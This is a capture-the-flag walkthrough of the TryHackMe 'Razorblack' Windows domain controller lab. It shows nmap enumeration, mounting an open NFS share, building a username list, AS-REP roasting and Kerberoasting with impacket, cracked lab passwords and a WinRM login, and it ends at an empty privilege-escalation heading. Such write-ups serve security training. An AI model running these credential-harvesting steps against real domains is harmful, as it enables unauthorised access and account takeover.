![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1c614190-3275-4523-9a8e-6bde500b8806)

## first enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Mon Apr  1 23:08:38 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,88,111,135,139,389,445,593,636,2049,3268,3269,3389,5985,9389 -Pn 10.10.35.124
Nmap scan report for 10.10.35.124
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-01 22:10:10Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-04-01T22:11:05+00:00; +1m24s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2024-03-31T22:05:52
|_Not valid after:  2024-09-30T22:05:52
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-01T22:10:57+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m24s, deviation: 0s, median: 1m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-01T22:10:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  1 23:10:57 2024 -- 1 IP address (1 host up) scanned in 139.69 seconds
```


## enumerating nfs

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ showmount -e 10.10.35.124    
Export list for 10.10.35.124:
/users (everyone)
                                                                                                                                                                                  
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ mkdir mount                                                                                 
                                                                                                                                                                                  
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ sudo mount -t nfs 10.10.35.124:/users ./mount -o nolock 
[sudo] password for n16hth4wk:

┌──(root㉿n16hth4wk-sec)-[/home/n16hth4wk/Documents/THM/Razorblack]
└─# cd mount    
                                                                                                                                                                                  
┌──(root㉿n16hth4wk-sec)-[/home/…/Documents/THM/Razorblack/mount]
└─# dir 
employee_status.xlsx  sbradley.txt
                                                                                                                                                                                  
┌──(root㉿n16hth4wk-sec)-[/home/…/Documents/THM/Razorblack/mount]
└─# ls     
employee_status.xlsx  sbradley.txt
```
first we check for nfs share available and next we mount the share. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3910a286-2cc6-4c2a-a651-4245ae591003)

checking the content of the xslx doc, we can see lists of users. 

```
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
```
we got the users available. in the mounted file, we can see a username `sbradley`, let's use this format to generate lists of usernames. 

```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```
made a list of usernames. let's try keberos tgt request on these usernames. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ impacket-GetNPUsers -dc-ip 10.10.35.124  -outputfile hashes.asreproast1 -usersfile user -request raz0rblack.thm/
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:b402a32bf45cbfb1e3f4aa8883a38c1e$20991bb387705e09fd43b4299000f464c863ad86f92e317596754993797d3a95aee1e1d5da35979673cc7b9a6cc3e620c51562a0db0ce475108a1130a3eee1ebcbddae63a033ff84e1f91681d998de75c1372b5b2c391dc7a09a50ae9ea98c24a3d96f4ba087e19ca42ad1ea7650b598c1b45e4ebd1fcf206fb98e83586af03e82c0411c293d8ffed8cce863e19027735dfc44bbdfbe5a9066f771c81ae1697a68804670a815d6510f4402d16cc155a0483b2d129397a3879f5d7a721fba65779f5a3cb78198dee282fd72bb4a7c6fc40f9e177d40c79d2ff3022f1753168a045f8a49206ef89fa7807be28ef85041b5
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
we got user `twilliams` hash. let's crack it

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/95846b57-f1ce-4db0-9af7-537c7d137b69)

cracked the hash. `twilliams:roastpotatoes`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f8d5a3b1-8b9c-4128-9633-51ce525bd31c)

enumerating shares, we got some shares readable by the user `twilliams`. checked the shares nothing useful

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ impacket-GetUserSPNs -dc-ip 10.10.35.124  -outputfile hashes.asreproast1 -request raz0rblack.thm/twilliams
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 16:17:17.715160  <never>               



[-] CCache file is not found. Skipping...
                                                                                                                                                                                  
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ cat hashes.asreproast1 
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$7ae4457d8bf96d2c0748118da861fb6f$5d18faaced9393e01b82c46741898aab905e0cd294afc46c6610035a620b7ee397f0f71fa14b0462c88c15ee9be832bd6291d4e3a778c88a6a55a669c14a19130ad241e8ee068992fc03de9a0440f07e5a428c5bf6f9a63f5fe84e9db8679e5fb127dc3d90acda058c2e4e1c0f22328bb2d4d055dede1b809f3403c7caf850afebd23ed3af568ccc531060363b24360a5e1ca7638f1121c9c9cf4e760364aed4581fa63f4e64e2e458343fa6e74e7e0757e1366d042f0276e96ebdc8e606f615aa5504408e53dbd4dcbbe3c250ef4f735130442364211902a9c5ac2e36ebc4e1173c30cf343c35a66370453ae71e0987426c33630c01e07b20679be4f4b37f763211fc4ccd027311f3da82e0ca21b060395701e669dc016c40a4743c005a980505523a1915d98de703a4a004d600f0f81ab87a466707e9883de5865c3b00d4e515d8c8c25058542d68541bfb7161d3ef65f45dbd0c1813c8eda752d44172df55def38393a84099641524901264cbe5e40d76e8fc3c77cc59c589a899c6c85f5215e9d3f88837bbf6dad2dd60a56db289bdea8dcac3ed900327ec9e1590edd2f8b444518da403dc1babc2704f9f35be7fdaeaa4f8ff1051827033cadbbd7c1d1f48d0561b8ce94946c50011b2b8db419ad7160751deed85680f710d84e85c645fc84687e667b92ee42ad7ddf04be1c3e1c6f062af80525b0224f0aa1bc6dddcebeff3fd8307384eaa22cacd2787db1eb042520ecaa943191d0c73d27c20645bfce23dce538c42e8e9c13e807b761ce6754901f60fa6490ca262b2223a373284a8177c3dc5046b30999dae25401432ec1dd5713a304ca66a75e9b667696513df9061739443d0c402dd8738819e121cb60d104250a44942b3077fd6ba6907701d44971ef98c07a60efa5f2065c4e93a2ec2161ea35ee584a23170bc6e251c6b9d83bd91796c2ba22e3a855010d25f537e9486cb161e1172f835346b8d44e82799e332f9a6178446ade77e484077356b2d3444574ed2495146bd77b258e916e3fd8c52459e839799a82db133f88aaebb8af5cffdf6f5bb3d5fb6b42f65dd47944af2e5b077e392818280dda61a4d3f1ba762bd8f6a8ab8f7392fc5aa58e6036619375b49617de219bf04576942487574964bf02b5aac1fcf9aeb5456b4ecbf35257b2806964b801a9923a9b2162ac404d07e4e1eaa4340753b1c4a477107d122978bf23d2b3f175c0f53191d20b4b2deb64d6d61c237772a42bafe91d065ce203a42c127ea9ae3c672f45700fcfc63bf419348d7dfb40091a6094ab4cb13ccaa881db8af9d7e1ff01e6cf650c5c028af82c43e74dc417a37c1dddadb5bd4394bd4d3eb487fe16bcd67d816284819661ab5d13b42b6cd951136acd8a494a61d29463766b86b097ee1ece13fa58c1b46a225b4
```
using the cred to perform keberoasting, we got another user hash. let's crack it. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8d79d3cc-6846-4fb1-bf84-7dfb3e8e6ec3)

cracked the hash. `*xyan1d3:cyanide9amine5628`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6298ff3e-3d3e-4637-ba2b-5be803bd8d41)

Enumerating smb shares, we can see we have some juicy permissions. let's check it out. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3d6d9dc0-ded8-4fbd-8f2c-584e96a47fc0)

tried winrm and we can login winrm using the cred. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/69ef837f-2849-459f-aabb-837476ae8473)

logged in using winrm. 


## Privilege Escalation






